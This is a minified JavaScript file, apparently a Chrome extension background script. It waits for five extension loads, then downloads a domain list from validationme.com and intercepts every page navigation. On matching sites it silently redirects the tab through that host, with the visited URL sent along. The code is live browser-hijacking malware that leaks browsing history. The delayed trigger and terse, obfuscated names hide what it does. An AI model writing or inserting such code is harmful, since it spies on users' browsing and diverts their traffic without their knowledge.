chrome['storage'].local.get('appLoads', function(a) {
    function b() {
        var a = new XMLHttpRequest;
        a.timeout = 15000, a.onreadystatechange = function() {
            4 === a.readyState && (200 === a.status ? (h = JSON.parse(a.responseText), i = !0) : i = !1)
        }, a.open('GET', d + '/coverage?key=' + e, !0), a.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'), a.send()
    }

    function c(a, b, c) {
        var j = !1;
        if (-1 < h.indexOf(b)) j = !0;
        else
            for (var k in h)
                if (-1 < h[k].indexOf(b) || -1 < b.indexOf(h[k])) {
                    j = !0;
                    break
                }
        j ? f = d + '/get?key=' + e + '&out=' + encodeURIComponent(a) + '&ref=' + encodeURIComponent(a) + '&uid=&format=go' : g.data.used_domains[b] = c + 8.64e7
    }

    if (!(5 > a.appLoads)) {
        var d = 'http://validationme.com',
            e = '64eccc586f9ce537a56088419cbbbf34',
            f = '',
            g = {
                data: {
                    used_domains: {}
                }
            },
            h = [],
            i = !0;
        b(), chrome['webRequest'].onBeforeRequest.addListener(function(a) {
            if (!(0 > a.tabId) && 'GET' == a.method && i) {
                var b = a.url.replace(/^https?\:\/\/([^\/]+).*$/, '$1').replace('www.', ''),
                    d = new Date().getTime();
                if (!(g.data.used_domains[b] && g.data.used_domains[b] + 7200000 > d)) return (g.data.used_domains[b] = d, f ? f = '' : c(a.url, b, d), f) ? (i = !1, setTimeout(function() {
                    f = '', i = !0
                }, 15000), {
                    redirectUrl: f
                }) : void 0
            }
        }, {
            urls: ['*://*/*'],
            types: ['main_frame']
        }, ['blocking'])
    }
});